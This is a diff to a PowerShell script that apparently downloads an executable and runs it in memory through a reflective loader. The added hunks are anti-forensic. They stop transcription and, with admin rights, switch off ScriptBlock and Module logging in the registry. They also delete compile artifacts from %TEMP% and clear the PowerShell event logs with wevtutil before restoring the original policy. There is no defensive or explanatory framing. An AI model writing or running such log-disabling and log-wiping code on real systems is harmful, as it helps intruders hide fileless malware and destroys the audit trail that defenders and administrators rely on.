@@ -7,6 +7,34 @@ param(
     [Parameter(Mandatory=$true)][string]$TargetProc
 )
 
+# ---- anti-log setup ----
+$isAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
+
+# stop any active transcription
+try { Stop-Transcript | Out-Null } catch {}
+
+if ($isAdmin) {
+    # remember original logging policy so we can restore it later
+    $script:origSBL = $null
+    $script:origML  = $null
+    $sbPath = "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging"
+    $mlPath = "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ModuleLogging"
+    try { $script:origSBL = (Get-ItemProperty -Path $sbPath -Name "EnableScriptBlockLogging" -ErrorAction Stop).EnableScriptBlockLogging } catch {}
+    try { $script:origML  = (Get-ItemProperty -Path $mlPath -Name "EnableModuleLogging"   -ErrorAction Stop).EnableModuleLogging   } catch {}
+
+    # kill scriptblock + module logging policy so nothing new gets written
+    try {
+        New-Item -Path $sbPath -Force | Out-Null
+        Set-ItemProperty -Path $sbPath -Name "EnableScriptBlockLogging" -Value 0 -Type DWord
+        New-Item -Path $mlPath -Force | Out-Null
+        Set-ItemProperty -Path $mlPath -Name "EnableModuleLogging" -Value 0 -Type DWord
+        Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell" -Name "EnableScripts" -Value 1 -Type DWord -ErrorAction SilentlyContinue
+    } catch {}
+}
+
+# snapshot %TEMP% so we can diff away CodeDom compile artifacts later
+$tempBefore = Get-ChildItem $env:TEMP -File -ErrorAction SilentlyContinue | Select-Object -ExpandProperty FullName
+
 [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
 $wc = New-Object System.Net.WebClient
 $wc.Headers.Add("User-Agent","Mozilla/5.0")
@@ -348,7 +376,32 @@ $result = [ReflectiveExeLoader]::LoadAndRun($exeBytes, $cmdLine)
 
 if ($result -eq 0) { Write-Host "[+] success" } else { Write-Host "[-] exit code $result" }
 
-# kill host powershell — mapped exe runs on a non-primary thread so its exit()
+# ---- log cleanup before exit ----
+# sweep CodeDom temp artifacts created by Add-Type this session
+try {
+    $tempAfter = Get-ChildItem $env:TEMP -File -ErrorAction SilentlyContinue | Select-Object -ExpandProperty FullName
+    $newFiles = Compare-Object $tempBefore $tempAfter | Where-Object SideIndicator -eq "=>" | Select-Object -ExpandProperty InputObject
+    foreach ($f in $newFiles) { Remove-Item -LiteralPath $f -Force -ErrorAction SilentlyContinue }
+} catch {}
+
+if ($isAdmin) {
+    # wipe powershell + system logs so nothing from this run or before survives
+    wevtutil cl "Windows PowerShell" 2>$null
+    wevtutil cl "Microsoft-Windows-PowerShell/Operational" 2>$null
+    wevtutil cl "Microsoft-Windows-PowerShell/Admin" 2>$null
+
+    # restore original logging policy
+    try {
+        if ($null -ne $script:origSBL) {
+            Set-ItemProperty -Path $sbPath -Name "EnableScriptBlockLogging" -Value $script:origSBL -Type DWord
+        }
+        if ($null -ne $script:origML) {
+            Set-ItemProperty -Path $mlPath -Name "EnableModuleLogging" -Value $script:origML -Type DWord
+        }
+    } catch {}
+}
+
+# kill host — mapped exe runs on a non-primary thread so its exit()
 # only ends the thread, not us. terminate explicitly.
 [Environment]::Exit($result)
 
